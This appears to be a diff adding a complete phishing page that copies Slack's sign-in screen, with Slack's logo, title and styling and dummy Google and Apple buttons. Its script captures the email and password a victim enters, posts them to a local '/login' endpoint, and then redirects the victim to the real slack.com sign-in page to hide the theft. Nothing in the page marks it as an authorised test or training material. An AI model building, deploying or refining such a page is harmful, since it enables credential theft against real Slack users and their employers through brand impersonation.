@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in | Slack</title>
+    <style>
+        body {
+            font-family: "Slack-Lato", appleLogo, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #fff;
+            padding-top: 40px;
+        }
+        .logo {
+            margin-bottom: 40px;
+        }
+        .logo img {
+            height: 34px;
+        }
+        h1 {
+            font-size: 48px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            margin-bottom: 10px;
+            color: #1d1c1d;
+        }
+        p {
+            font-size: 18px;
+            line-height: 27px;
+            margin-bottom: 32px;
+            color: #454245;
+            max-width: 700px;
+            text-align: center;
+        }
+        .container {
+            width: 400px;
+            text-align: center;
+        }
+        .google-btn, .apple-btn {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #1d1c1d;
+            border-radius: 4px;
+            background: #fff;
+            font-size: 18px;
+            font-weight: 900;
+            color: #1d1c1d;
+            cursor: pointer;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+        .google-btn:hover, .apple-btn:hover {
+            box-shadow: 0 1px 4px rgba(0,0,0,0.3);
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+        }
+        .divider span {
+            padding: 0 10px;
+            color: #616061;
+            font-size: 15px;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-top: 1px solid #ddd;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #868686;
+            border-radius: 4px;
+            font-size: 18px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            color: #1d1c1d;
+        }
+        input:focus {
+            border-color: #1264a3;
+            box-shadow: 0 0 0 4px rgba(29,155,209,0.3);
+            outline: none;
+        }
+        .signin-btn {
+            background-color: #4a154b;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+            padding: 14px;
+            font-size: 18px;
+            font-weight: 900;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .signin-btn:hover {
+            background-color: #350d36;
+        }
+        .footer {
+            margin-top: 80px;
+            color: #696969;
+            font-size: 14px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        .footer a {
+            color: #696969;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+            color: #1264a3;
+        }
+    </style>
+    <script>
+        async function handleLogin(event) {
+            event.preventDefault();
+            const form = event.target;
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+            
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    window.location.href = "https://slack.com/signin";
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/Slack_icon_2019.svg/500px-Slack_icon_2019.svg.png" alt="Slack">
+    </div>
+    
+    <h1>Sign in to Slack</h1>
+    <p>We suggest using the <strong>email address you use at work.</strong></p>
+    
+    <div class="container">
+        <button class="google-btn">Sign in with Google</button>
+        <button class="apple-btn">Sign in with Apple</button>
+        
+        <div class="divider">
+            <span>OR</span>
+        </div>
+        
+        <form id="login-form" onsubmit="handleLogin(event)">
+            <input type="email" id="email" name="email" placeholder="name@work-email.com" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            
+            <button type="submit" class="signin-btn">Sign In with Email</button>
+        </form>
+        
+        <div style="margin-top: 24px; color: #616061; font-size: 14px;">
+            New to Slack? <a href="#" style="color: #1264a3; text-decoration: none;">Create an account</a>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <a href="#">Privacy & Terms</a>
+        <a href="#">Contact Us</a>
+        <a href="#">Change Region</a>
+    </div>
+</body>
+</html>
